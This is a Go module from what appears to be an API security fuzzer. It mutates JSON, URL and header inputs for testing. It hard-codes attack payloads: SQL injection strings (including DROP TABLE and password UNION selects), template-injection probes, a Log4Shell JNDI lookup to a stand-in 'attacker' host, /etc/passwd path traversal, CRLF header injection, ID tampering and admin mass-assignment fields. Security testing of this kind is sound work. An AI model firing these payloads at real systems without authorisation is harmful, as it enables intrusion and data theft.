// PulseFuzz — мутатор JSON-пейлоадов.
// Модуль: internal/mutator
//
// Задача: рекурсивная трансформация OpenAPI-схемы/примера в набор аномальных
// пейлоадов: граничные значения, SQLi/SSTI/Header-инъекции, IDOR, type-confusion.
package mutator

import (
	"encoding/json"
	"fmt"
	"math"
	"math/rand"
	"strconv"
	"strings"
)

// FuzzMode — режимы мутации (зеркалит proto FuzzRequest.fuzz_modes)
type FuzzMode int

const (
	ModeBoundary FuzzMode = 1 << iota // граничные значения
	ModeSQLi
	ModeSSTI
	ModeIDOR
	ModeTypeConfusion
	ModeChaos // задержки, подмена статус-кодов (WebSocket-брейкпоинт)
)

// Mutator — детерминированный + рандомизированный генератор.
// Seed фиксирует детерминизм повторов (важно для регрессий).
type Mutator struct {
	modes FuzzMode
	rng   *rand.Rand
}

func New(modes FuzzMode, seed int64) *Mutator {
	return &Mutator{modes: modes, rng: rand.New(rand.NewSource(seed))}
}

// --- Векторы инъекций ---
var sqlInjection = []string{
	"' OR '1'='1",
	"' OR 1=1--",
	`"; DROP TABLE users; --`,
	"' UNION SELECT username,password FROM users--",
	`\' OR sleep(5)--`,
	"' AND 1=2 UNION SELECT @@version--",
}

var sstiVectors = []string{
	"{{7*7}}",
	"${7*7}",
	"{{config}}",
	"${jndi:ldap://attacker/exp}", // Log4Shell
	"{%include('/etc/passwd')%}",
	"#{7*7}",
}

var headerInjection = []string{
	"\r\nX-Injected: 1",
	"\nSet-Cookie: session=evil",
	"\r\nContent-Length: 0\r\n\r\n",
}

var pathTraversal = []string{
	"../../../../etc/passwd",
	"..%2f..%2fetc%2fpasswd",
	"/etc/passwd%00",
	"....//....//etc/passwd",
}

var idorCandidates = []string{"id", "user_id", "order_id", "account_id", "uid", "uuid", "item_id"}

// BoundaryValues возвращает граничные числа для целочисленных полей.
func BoundaryValues() []int64 {
	return []int64{
		0, -1, 1,
		math.MaxInt64, math.MinInt64,
		1 << 31, (1 << 31) - 1,
		1<<63 - 1,
		999999999,
	}
}

// MutateJSON — главный вход. Принимает исходный пейлоад и возвращает
// массив мутированных версий (по одной на каждую точку вставки).
func (m *Mutator) MutateJSON(payload map[string]any) []map[string]any {
	var out []map[string]any

	var walk func(cur map[string]any, prefix string)
	walk = func(cur map[string]any, prefix string) {
		for k, v := range cur {
			path := prefix + "/" + k

			// 1. Числовые поля → граничные значения
			if m.modes&ModeBoundary != 0 {
				if f, ok := numericValue(v); ok {
					for _, b := range BoundaryValues() {
						if int64(f) != b {
							c := clone(cur)
							c[k] = b
							out = append(out, c)
						}
					}
				}
			}

			// 2. Строковые поля → инъекции
			if s, ok := v.(string); ok {
				if m.modes&ModeSQLi != 0 {
					for _, inj := range sqlInjection {
						c := clone(cur)
						c[k] = s + inj
						out = append(out, c)
					}
				}
				if m.modes&ModeSSTI != 0 {
					for _, v := range sstiVectors {
						c := clone(cur)
						c[k] = v
						out = append(out, c)
					}
				}
			}

			// 3. IDOR — подмена идентификаторов на чужие
			if m.modes&ModeIDOR != 0 {
				for _, cand := range idorCandidates {
					if strings.EqualFold(k, cand) {
						for _, foreign := range []any{"1", "2", "-1", "00000000-0000-0000-0000-000000000001", "admin"} {
							c := clone(cur)
							c[k] = foreign
							out = append(out, c)
						}
					}
				}
			}

			// 4. Type confusion — замена типа поля
			if m.modes&ModeTypeConfusion != 0 {
				switch t := v.(type) {
				case string:
					if _, err := strconv.Atoi(t); err == nil {
						c := clone(cur)
						c[k] = math.NaN() // NaN → 500/validation bypass
						out = append(out, c)
					}
				case float64:
					c := clone(cur)
					c[k] = []any{"x", map[string]any{"inner": 1}}
					out = append(out, c)
				case nil:
					c := clone(cur)
					c[k] = []any{}
					out = append(out, c)
				}
			}

			// 5. Mass assignment — добавление привилегированных полей
			if m.modes&ModeChaos != 0 && k == "role" {
				c := clone(cur)
				c["is_admin"] = true
				c["price"] = 0
				c["balance"] = 1e15
				out = append(out, c)
			}

			// рекурсия в вложенные объекты
			if nested, ok := v.(map[string]any); ok {
				walk(nested, path)
			}
		}
	}

	walk(payload, "")
	return out
}

// MutateURL — фаззинг query/path-параметров и заголовков.
func (m *Mutator) MutateURL(base string, params map[string]string) []string {
	var out []string
	for k, v := range params {
		for _, pt := range pathTraversal {
			out = append(out, fmt.Sprintf("%s?%s=%s", base, k, pt))
		}
		if m.modes&ModeSQLi != 0 {
			for _, inj := range sqlInjection {
				out = append(out, fmt.Sprintf("%s?%s=%s", base, k, urlEncode(inj)))
			}
		}
		_ = v
	}
	return out
}

// FuzzHeaders возвращает набор заголовков с инъекциями CRLF.
func (m *Mutator) FuzzHeaders() []map[string]string {
	var out []map[string]string
	for _, h := range headerInjection {
		out = append(out, map[string]string{"User-Agent": h})
	}
	return out
}

// --- утилиты ---
func clone(m map[string]any) map[string]any {
	data, _ := json.Marshal(m)
	var c map[string]any
	_ = json.Unmarshal(data, &c)
	return c
}

func numericValue(v any) (float64, bool) {
	switch n := v.(type) {
	case float64:
		return n, true
	case json.Number:
		f, err := n.Float64()
		return f, err == nil
	}
	return 0, false
}

func urlEncode(s string) string {
	r := strings.NewReplacer(
		"'", "%27", " ", "%20", "/", "%2f", "=", "%3d",
		"--", "%2d%2d", ";", "%3b", "\"", "%22",
	)
	return r.Replace(s)
}

// ChaosSpec — параметры WebSocket-брейкпоинта (хаос-инжиниринг).
type ChaosSpec struct {
	DelayMs    int            `json:"delay_ms"`
	OverrideStatus int        `json:"override_status"`
	DropConn   bool           `json:"drop_conn"`
	MutateBody map[string]any `json:"mutate_body,omitempty"`
}

// GenerateChaosSpec возвращает конфигурацию хаос-инъекции для перехвата запроса.
func (m *Mutator) GenerateChaosSpec() ChaosSpec {
	return ChaosSpec{
		DelayMs:        m.rng.Intn(3000),
		OverrideStatus: []int{0, 500, 503, 429}[m.rng.Intn(4)],
		DropConn:       m.rng.Intn(10) == 0,
	}
}
